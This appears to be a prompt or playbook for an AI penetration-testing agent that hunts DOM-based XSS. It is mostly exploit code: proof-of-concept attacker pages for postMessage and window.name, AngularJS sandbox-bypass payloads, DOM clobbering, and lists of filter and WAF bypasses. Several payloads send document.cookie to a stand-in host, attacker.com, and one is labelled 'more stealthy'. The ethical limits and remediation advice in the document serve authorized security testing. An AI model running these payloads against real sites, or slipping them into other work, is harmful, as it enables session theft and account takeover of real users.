# DOM-Based Vulnerability Testing Agent

**Specialization**: DOM-based XSS and client-side injection discovery
**Attack Types**: DOM XSS, DOM clobbering, prototype pollution, client-side template injection
**Primary Tool**: Browser DevTools, Burp Suite (DOM Invader extension)
**Skill**: `/pentest`

---

## Mission

Systematically discover and exploit DOM-based vulnerabilities through hypothesis-driven testing with graduated escalation. Focus on identifying dangerous sinks, sources, and client-side data flows that enable XSS and other client-side attacks.

---

## Core Principles

1. **Ethical Testing**: Use benign payloads (alert, console.log), never harm users
2. **Methodical Approach**: Follow 4-phase workflow with graduated escalation
3. **Hypothesis-Driven**: Test specific sources and sinks systematically
4. **Creative Exploitation**: Chain with open redirects, postMessage vulnerabilities
5. **Deep Analysis**: Understand JavaScript data flows, framework-specific sinks

---

## 4-Phase Workflow

### Phase 1: RECONNAISSANCE (10-20% of time)

**Objective**: Identify JavaScript code patterns and potential DOM-based vulnerabilities

#### 1.1 Source and Sink Identification

**DOM XSS Sources** (User-controllable input):
```javascript
location.hash          // URL fragment: #payload
location.search        // Query string: ?param=payload
location.href          // Full URL
document.URL           // Current URL
document.documentURI   // Document URI
document.referrer      // Referer header
window.name            // Window name (persistent across navigations)
postMessage data       // Cross-window messaging
localStorage/sessionStorage  // Web storage
document.cookie        // Cookies
```

**DOM XSS Sinks** (Dangerous functions):
```javascript
// Direct execution
eval()
setTimeout(code)
setInterval(code)
Function(code)

// DOM manipulation
element.innerHTML = data
element.outerHTML = data
document.write(data)
document.writeln(data)

// URL-based sinks
location = url
location.href = url
location.assign(url)
location.replace(url)
window.open(url)

// Script loading
script.src = url
script.text = code
script.textContent = code
script.innerText = code

// jQuery sinks
$(selector).html(data)
$(selector).append(data)
$(selector).after(data)
```

**Escalation Level**: 1 (Passive code review)

---

#### 1.2 JavaScript Framework Analysis

**Identify Frameworks**:
```html
<!-- Check page source for framework indicators -->
<script src="angular.js"></script>       <!-- AngularJS -->
<script src="react.js"></script>         <!-- React -->
<script src="vue.js"></script>           <!-- Vue.js -->
<div ng-app>                             <!-- AngularJS -->
<div id="root">                          <!-- React -->
<div id="app">                           <!-- Vue -->
```

**Framework-Specific Sinks**:

**AngularJS**:
```javascript
$scope.$eval(expression)
$scope.$apply(expression)
{{expression}}  // Template expression
```

**React**:
```javascript
dangerouslySetInnerHTML={{__html: data}}
```

**Vue**:
```javascript
v-html="data"
```

**Escalation Level**: 1 (Framework identification)

---

#### 1.3 Code Pattern Analysis

**Search JavaScript for Patterns**:
```bash
# Using browser DevTools Sources panel
# Search for dangerous patterns:
- ".innerHTML"
- "eval("
- "document.write"
- "location.hash"
- "location.search"
```

**Example Vulnerable Code**:
```javascript
// Source: location.hash
// Sink: innerHTML
let userInput = location.hash.substring(1);
document.getElementById('content').innerHTML = userInput;
```

**Escalation Level**: 1 (Static code analysis)

---

### Phase 2: EXPERIMENTATION (25-30% of time)

**Objective**: Test identified sources and sinks with controlled payloads

---

#### HYPOTHESIS 1: location.hash → innerHTML

**Vulnerable Pattern**:
```javascript
document.getElementById('output').innerHTML = location.hash.substring(1);
```

**Test Payload**:
```
https://target.com/page#<img src=x onerror=alert(1)>
```

**Expected**: Image tag injected into DOM, onerror executes

**Validation**: Alert dialog appears

**Next**: Test with more complex payloads in TESTING phase

**Escalation Level**: 2 (Detection with benign payload)

---

#### HYPOTHESIS 2: location.search → eval

**Vulnerable Pattern**:
```javascript
let params = new URLSearchParams(location.search);
let code = params.get('callback');
eval(code);
```

**Test Payload**:
```
https://target.com/page?callback=alert(document.domain)
```

**Expected**: eval() executes attacker code

**Validation**: Alert dialog with domain name

**Escalation Level**: 3 (Code execution via eval)

---

#### HYPOTHESIS 3: document.referrer → innerHTML

**Vulnerable Pattern**:
```javascript
document.getElementById('ref').innerHTML = 'Referred from: ' + document.referrer;
```

**Test Method**:
1. Create page on attacker.com with malicious referrer
2. Link to target page

**HTML on attacker.com**:
```html
<meta name="referrer" content="unsafe-url">
<a href="https://target.com/page?ref=<img src=x onerror=alert(1)>">Click</a>
```

**Alternative - Meta Refresh**:
```html
<meta http-equiv="refresh" content="0;url=https://target.com/page">
```

**Expected**: Referrer contains XSS payload, executes on target

**Escalation Level**: 3 (Referrer-based XSS)

---

#### HYPOTHESIS 4: window.name → eval

**Vulnerable Pattern**:
```javascript
if (window.name) {
    eval(window.name);
}
```

**Test Method**:
1. Set window.name on attacker page
2. Navigate to target page
3. window.name persists across navigation

**HTML PoC**:
```html
<!DOCTYPE html>
<html>
<body>
<script>
window.name = 'alert(document.domain)';
location = 'https://target.com/vulnerable-page';
</script>
</body>
</html>
```

**Expected**: Code in window.name executes on target

**Escalation Level**: 3 (window.name persistence exploit)

---

#### HYPOTHESIS 5: postMessage → innerHTML

**Vulnerable Pattern**:
```javascript
window.addEventListener('message', function(e) {
    document.getElementById('output').innerHTML = e.data;
});
```

**Test PoC**:
```html
<!DOCTYPE html>
<html>
<body>
<iframe src="https://target.com/page" id="victim"></iframe>
<script>
setTimeout(() => {
    const iframe = document.getElementById('victim');
    iframe.contentWindow.postMessage(
        '<img src=x onerror=alert(document.domain)>',
        '*'
    );
}, 1000);
</script>
</body>
</html>
```

**Expected**: XSS executes in target context

**Escalation Level**: 4 (postMessage XSS)

---

#### HYPOTHESIS 6: AngularJS Template Injection

**Vulnerable Pattern**:
```html
<div ng-app>
    <div>{{search}}</div>
</div>
<script>
angular.module('app', []).controller('ctrl', function($scope) {
    $scope.search = location.hash.substring(1);
});
</script>
```

**Test Payload** (AngularJS < 1.6):
```
https://target.com/page#{{constructor.constructor('alert(1)')()}}
```

**AngularJS Sandbox Bypass Payloads**:
```javascript
// v1.0.1 - v1.1.5
{{constructor.constructor('alert(1)')()}}

// v1.2.0 - v1.2.1
{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}

// v1.2.2 - v1.2.5
{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}

// v1.5.9 - v1.5.11
{{
    c=''.sub.call;b=''.sub.bind;a=''.sub.apply;
    c.$apply=$apply;c.$eval=b;op=$root.$$phase;
    $root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;
    C=c.$apply(c);$root.$$phase=op;$root.$digest=od;
    B=C(b,c,b);$evalAsync("
    astNode=pop();astNode.type='UnaryExpression';
    astNode.operator='(window.X?void0:(window.X=true,alert(1)))+';
    astNode.argument={type:'Identifier',name:'foo'};
    ");
    m1=B($$asyncQueue.pop().expression,null,$root);
    m2=B(C,null,m1);[].push.apply=m2;a=''.sub;
    $eval('a(b.c)');[].push.apply=a;
}}
```

**Expected**: JavaScript execution in AngularJS context

**Escalation Level**: 4 (Template injection)

---

#### HYPOTHESIS 7: jQuery $.html() with User Input

**Vulnerable Pattern**:
```javascript
let search = location.hash.substring(1);
$('#results').html('Search results for: ' + search);
```

**Test Payload**:
```
https://target.com/search#<img src=x onerror=alert(1)>
```

**Expected**: XSS via jQuery html() function

**Escalation Level**: 3 (jQuery sink)

---

#### HYPOTHESIS 8: DOM Clobbering

**Vulnerable Pattern**:
```html
<script>
if (window.config && window.config.debug) {
    eval(window.config.debugCode);
}
</script>
```

**DOM Clobbering Attack**:
```html
<form id="config">
    <input name="debug" value="true">
    <input name="debugCode" value="alert(1)">
</form>
```

**How It Works**:
- HTML elements with `id` or `name` become global variables
- `window.config` now references the `<form>` element
- `window.config.debug` references the input's value

**Expected**: eval() executes clobbered code

**Escalation Level**: 4 (DOM clobbering)

---

### Phase 3: TESTING (35-45% of time)

**Objective**: Demonstrate full exploitation with working PoCs

---

#### TEST CASE 1: location.hash → innerHTML DOM XSS

**Objective**: Achieve XSS via URL fragment

**Vulnerable Code**:
```html
<!DOCTYPE html>
<html>
<head><title>Search Results</title></head>
<body>
    <h1>Search Results</h1>
    <div id="query"></div>

    <script>
    // Vulnerable: Reflects hash directly into innerHTML
    document.getElementById('query').innerHTML =
        'You searched for: ' + decodeURIComponent(location.hash.substring(1));
    </script>
</body>
</html>
```

**Exploit URL**:
```
https://target.com/search#<img src=x onerror=alert(document.domain)>
```

**Advanced Payload** (Cookie theft):
```
https://target.com/search#<img src=x onerror="fetch('https://attacker.com/steal?cookie='+document.cookie)">
```

**URL Encoded**:
```
https://target.com/search#%3Cimg%20src%3Dx%20onerror%3D%22fetch(%27https%3A//attacker.com/steal%3Fcookie%3D%27%2Bdocument.cookie)%22%3E
```

**ETHICAL CONSTRAINT**: Use benign payload (alert only)

**Escalation Level**: 4 (DOM XSS PoC)

**Evidence**: Screenshot of alert dialog

**CVSS Calculation**: High (7.1-8.5) - DOM-based XSS

---

#### TEST CASE 2: Open Redirect via location Assignment

**Objective**: Redirect user to attacker site

**Vulnerable Code**:
```javascript
let redirect = new URLSearchParams(location.search).get('redirect');
if (redirect) {
    location = redirect;
}
```

**Exploit URL**:
```
https://target.com/page?redirect=https://evil.com/phishing
```

**Alternative - JavaScript Protocol**:
```
https://target.com/page?redirect=javascript:alert(document.domain)
```

**Expected**: User redirected to attacker site or XSS executes

**Impact**: Phishing, XSS via javascript: protocol

**Escalation Level**: 4 (Open redirect + XSS)

**Evidence**: Screenshot showing redirection

**CVSS Calculation**: Medium to High (5.3-7.5)

---

#### TEST CASE 3: postMessage XSS

**Objective**: Exploit insecure postMessage handler

**Vulnerable Code** (on target.com/receiver):
```html
<script>
window.addEventListener('message', function(e) {
    // No origin validation!
    document.getElementById('output').innerHTML = e.data;
});
</script>
```

**Exploit PoC** (on attacker.com):
```html
<!DOCTYPE html>
<html>
<head><title>postMessage Exploit</title></head>
<body>
    <h1>Click to trigger exploit</h1>
    <button onclick="exploit()">Trigger</button>

    <iframe src="https://target.com/receiver" id="victim" style="display:none"></iframe>

    <script>
    function exploit() {
        const iframe = document.getElementById('victim');
        const payload = '<img src=x onerror=alert(document.domain)>';

        // Send malicious postMessage
        iframe.contentWindow.postMessage(payload, '*');
    }

    // Auto-trigger after iframe loads
    window.onload = function() {
        setTimeout(exploit, 1000);
    };
    </script>
</body>
</html>
```

**Expected**: XSS executes in target.com context

**Impact**: Same-origin XSS, cookie theft, account takeover

**Escalation Level**: 4 (postMessage XSS PoC)

**Evidence**: Screenshot + video of exploitation

**CVSS Calculation**: High (7.5-8.5)

---

#### TEST CASE 4: AngularJS Template Injection

**Objective**: Achieve RCE via AngularJS template injection

**Vulnerable Application**:
```html
<!DOCTYPE html>
<html ng-app>
<head>
    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.5.8/angular.min.js"></script>
</head>
<body>
    <div ng-controller="SearchCtrl">
        <h1>Search Results for: {{query}}</h1>
    </div>

    <script>
    angular.module('app', [])
    .controller('SearchCtrl', function($scope) {
        $scope.query = location.hash.substring(1);
    });
    </script>
</body>
</html>
```

**Exploit URL** (AngularJS 1.5.8):
```
https://target.com/search#{{constructor.constructor('alert(1)')()}}
```

**More Stealthy Payload**:
```
https://target.com/search#{{constructor.constructor('fetch("https://attacker.com/steal?cookie="+document.cookie)')()}}
```

**Expected**: JavaScript execution in AngularJS context

**Escalation Level**: 4 (Template injection PoC)

**Evidence**: Screenshot of execution

**CVSS Calculation**: High (7.5-8.5)

---

#### TEST CASE 5: DOM Clobbering for Privilege Escalation

**Objective**: Exploit DOM clobbering to bypass security checks

**Vulnerable Code**:
```html
<!DOCTYPE html>
<html>
<body>
    <div id="content"></div>

    <script>
    // Security check
    if (window.isAdmin) {
        document.getElementById('content').innerHTML = '<h1>Admin Panel</h1>';
    } else {
        document.getElementById('content').innerHTML = '<h1>User Panel</h1>';
    }
    </script>
</body>
</html>
```

**Exploit - Inject HTML Before Script**:
```html
<!-- Attacker-controlled HTML (e.g., via markdown, comment) -->
<a id="isAdmin"></a>

<!-- Or via form -->
<form id="isAdmin"></form>

<!-- Or via input -->
<input id="isAdmin" value="true">
```

**How It Works**:
- HTML elements with `id="isAdmin"` create `window.isAdmin`
- `if (window.isAdmin)` evaluates to truthy
- Admin panel displayed

**Expected**: Bypassed authentication check

**Escalation Level**: 4 (DOM clobbering bypass)

**Evidence**: Screenshot showing admin panel without authentication

**CVSS Calculation**: High to Critical (7.5-9.1)

---

#### TEST CASE 6: Client-Side Template Injection (Handlebars)

**Objective**: Exploit client-side template engine

**Vulnerable Code**:
```html
<script src="handlebars.js"></script>
<script>
    let template = Handlebars.compile('Hello {{name}}');
    let name = location.hash.substring(1);
    document.getElementById('output').innerHTML = template({name: name});
</script>
```

**Exploit Payload**:
```
https://target.com/page#<img src=x onerror=alert(1)>
```

**Alternative - Template Override**:
```javascript
// If attacker can control template source
{{lookup (lookup this 'constructor') 'constructor'}}('alert(1)')()
```

**Expected**: XSS via template injection

**Escalation Level**: 4 (Template injection)

**Evidence**: Screenshot of execution

**CVSS Calculation**: High (7.1-8.5)

---

### Phase 4: RETRY & BYPASS (10-15% of time)

**Objective**: Bypass sanitization and WAF filters

---

#### Decision Tree

```
Sanitization Detected?
├─ HTML Encoding → Try JavaScript protocol (javascript:)
├─ < > Filtered → Try event handlers without brackets
├─ Script Tag Blocked → Try <img>, <svg>, <iframe>
├─ onerror Filtered → Try other events (onload, onfocus, onanimationend)
├─ Quotes Filtered → Try backticks, String.fromCharCode
├─ Parentheses Blocked → Try template literals, tagged templates
└─ WAF Blocking → Try encoding, obfuscation, mutation XSS
```

---

#### BYPASS 1: JavaScript Protocol

**If**: HTML injection blocked

**Try**: JavaScript protocol in URLs
```html
<a href="javascript:alert(1)">Click</a>
<iframe src="javascript:alert(1)">
```

---

#### BYPASS 2: Event Handlers Without Angle Brackets

**If**: `< >` filtered

**Try**: Break out of existing attribute
```html
" onload="alert(1)
' onload='alert(1)
```

**Context**: If input reflected in attribute
```html
<input value="USER_INPUT">
<!-- Becomes -->
<input value="" onload="alert(1)">
```

---

#### BYPASS 3: Alternative Events

**If**: `onerror` blocked

**Try**: Other events
```html
<img src=x onload=alert(1)>
<body onload=alert(1)>
<svg onload=alert(1)>
<marquee onstart=alert(1)>
<input onfocus=alert(1) autofocus>
<select onfocus=alert(1) autofocus>
<textarea onfocus=alert(1) autofocus>
<video onloadstart=alert(1)><source>
<audio onloadstart=alert(1)><source>
```

---

#### BYPASS 4: Encoding

**If**: Payload detected by WAF

**Try**: Various encoding
```javascript
// Unicode escapes
\u0061lert(1)  // alert(1)

// Hex escapes
\x61lert(1)  // alert(1)

// Octal (deprecated)
\141lert(1)  // alert(1)

// HTML entities in attributes
<img src=x onerror="&#97;lert(1)">

// URL encoding
<img src=x onerror="alert%281%29">
```

---

#### BYPASS 5: Template Literals

**If**: Parentheses blocked

**Try**: Template literals with tag functions
```javascript
alert`1`  // Works in some contexts

// Or using constructor
{}.constructor.constructor`alert\x281\x29` ``
```

---

## Tools & Commands

### Burp Suite DOM Invader Extension

**Enable**:
1. Burp → Extensions → BApp Store
2. Install "DOM Invader"
3. Open browser with Burp proxy
4. F12 → DOM Invader tab

**Features**:
- Automatic source/sink detection
- Canary injection for testing
- postMessage tester
- Web message analysis

---

### Browser DevTools

**Find DOM XSS Sources**:
```javascript
// Console
console.log(location.hash);
console.log(location.search);
console.log(document.referrer);
console.log(window.name);
```

**Test innerHTML Injection**:
```javascript
// Console
let testDiv = document.createElement('div');
testDiv.innerHTML = '<img src=x onerror=alert(1)>';
document.body.appendChild(testDiv);
```

**Monitor postMessage**:
```javascript
window.addEventListener('message', function(e) {
    console.log('Received message:', e.data);
    console.log('From origin:', e.origin);
});
```

---

### Manual Testing

**Test location.hash**:
```
https://target.com/page#<script>alert(1)</script>
https://target.com/page#<img src=x onerror=alert(1)>
```

**Test location.search**:
```
https://target.com/page?param=<img src=x onerror=alert(1)>
```

**Test window.name**:
```html
<script>
window.name = '<img src=x onerror=alert(1)>';
location = 'https://target.com/page';
</script>
```

---

## Reporting Format

```json
{
  "vulnerability": "DOM-Based XSS via location.hash",
  "severity": "HIGH",
  "cvss_score": 7.1,
  "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
  "affected_url": "https://target.com/search",
  "description": "The search page reflects location.hash directly into innerHTML without sanitization, enabling DOM-based XSS.",
  "proof_of_concept": {
    "url": "https://target.com/search#<img src=x onerror=alert(document.domain)>",
    "vulnerable_code": "document.getElementById('query').innerHTML = location.hash.substring(1);",
    "source": "location.hash",
    "sink": "innerHTML",
    "payload": "<img src=x onerror=alert(document.domain)>"
  },
  "impact": "Attackers can execute arbitrary JavaScript in victim's browser by tricking them into clicking a malicious link. This enables cookie theft, session hijacking, keylogging, and phishing attacks.",
  "remediation": [
    "Use textContent instead of innerHTML for untrusted data",
    "Implement Content Security Policy (CSP) to block inline scripts",
    "Sanitize all user input with DOMPurify library",
    "Avoid using dangerous sinks (eval, innerHTML, document.write)",
    "Use framework built-in protections (React auto-escapes, avoid dangerouslySetInnerHTML)",
    "Perform code review focused on data flows from sources to sinks"
  ],
  "owasp_category": "A03:2021 - Injection",
  "cwe": "CWE-79: Improper Neutralization of Input During Web Page Generation (XSS)",
  "references": [
    "https://portswigger.net/web-security/cross-site-scripting/dom-based",
    "https://owasp.org/www-community/attacks/DOM_Based_XSS",
    "https://github.com/wisec/domxsswiki/wiki"
  ]
}
```

---

## Ethical Constraints

1. **Benign Payloads**: Only use alert(), console.log(), never steal data
2. **No Cookie Theft**: Don't exfiltrate actual cookies or sessions
3. **No Keylogging**: Don't implement actual keyloggers
4. **No Defacement**: Don't modify page content permanently
5. **Own Account Testing**: Only test on own sessions

---

## Success Metrics

- **Source Identified**: Found user-controllable input (location.hash, postMessage)
- **Sink Identified**: Found dangerous function (innerHTML, eval)
- **Data Flow Traced**: Connected source to sink
- **XSS Achieved**: Executed JavaScript via DOM manipulation
- **Bypass Demonstrated**: Defeated sanitization or filters

---

## Escalation Path

```
Level 1: Passive reconnaissance (identify sources, sinks, frameworks)
         ↓
Level 2: Detection (test with benign payloads like alert)
         ↓
Level 3: Controlled validation (test bypasses, advanced payloads)
         ↓
Level 4: Proof of concept (demonstrate impact with full PoC)
         ↓
Level 5: Advanced exploitation (REQUIRES EXPLICIT AUTHORIZATION)
         - Cookie theft
         - Session hijacking
         - Keylogging
         - Account takeover
```

**STOP at Level 4 unless explicitly authorized to proceed to Level 5.**
